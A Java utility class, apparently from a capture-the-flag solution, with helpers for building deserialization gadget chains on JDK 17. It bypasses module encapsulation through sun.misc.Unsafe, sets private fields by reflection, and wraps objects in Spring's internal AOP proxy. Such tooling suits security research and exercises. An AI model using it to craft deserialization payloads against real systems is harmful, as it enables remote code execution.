package solution;

import org.springframework.aop.framework.AdvisedSupport;
import sun.misc.Unsafe;

import javax.sql.DataSource;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Comparator;

public class Tools17 {
    static {
        try {
            bypassModule(Tools17.class);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public static void bypassModule(Class aClass) throws Exception{
        Class unsafeClass = Class.forName("sun.misc.Unsafe");
        Field field = unsafeClass.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);

        Field modules = Class.class.getDeclaredField("module");
        long l = unsafe.objectFieldOffset(modules);
        unsafe.getAndSetObject(aClass, l, Object.class.getModule());
    }

    public static byte[] ser(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        return baos.toByteArray();
    }

    public static Object deser(byte[] data) throws IOException, ClassNotFoundException {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        ObjectInputStream ois = new ObjectInputStream(bais);
        return ois.readObject();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
//        Tools17.bypassModule(this.getClass());
        Class<?> aClass = obj.getClass();
        Field field = null;
        while (aClass != null) {
            try {
                field = aClass.getDeclaredField(fieldName);
                break;
            } catch (NoSuchFieldException e) {
                aClass = aClass.getSuperclass();
            }
        }
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
//        Tools17.bypassModule(this.getClass());
        Class<?> aClass = obj.getClass();
        Field field = null;
        while (aClass != null) {
            try {
                field = aClass.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException e) {
                aClass = aClass.getSuperclass();
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e);
            }
        }
        return null;
    }

    public static Object makeTemplatesImplAopProxy(DataSource source) throws Exception {
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(source);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler);
        return proxy;
    }
}
